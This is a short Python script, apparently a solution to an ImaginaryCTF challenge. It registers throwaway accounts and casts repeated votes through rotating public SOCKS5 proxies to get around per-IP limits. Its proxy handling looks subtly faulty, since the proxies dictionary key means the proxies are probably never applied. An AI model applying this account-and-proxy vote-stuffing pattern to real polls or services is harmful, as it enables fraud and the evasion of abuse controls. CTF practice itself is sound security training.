import requests
import json
import random
import os

with open("proxy.json") as f:
    # curl 'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/json/proxies.json' -o proxy.json
    proxy = json.load(f)["socks5"]
print(proxy)


random.shuffle(proxy)
for p in proxy:
    try:
        sess = requests.Session()
        sess.post(
            "http://chal.imaginaryctf.org:1339/register",
            data={"user": os.urandom(8).hex(), "pass": os.urandom(8).hex()},
        )
        pr = "socks5://" + p
        r = sess.get(
            "http://chal.imaginaryctf.org:1339/vote/04f0285f81844e2dbaa900f807fb6d85",
            proxies={"socks5": pr},
            timeout=3,
        )
        print(r.text)
    except Exception as exc:
        print(exc)
    except KeyboardInterrupt:
        break
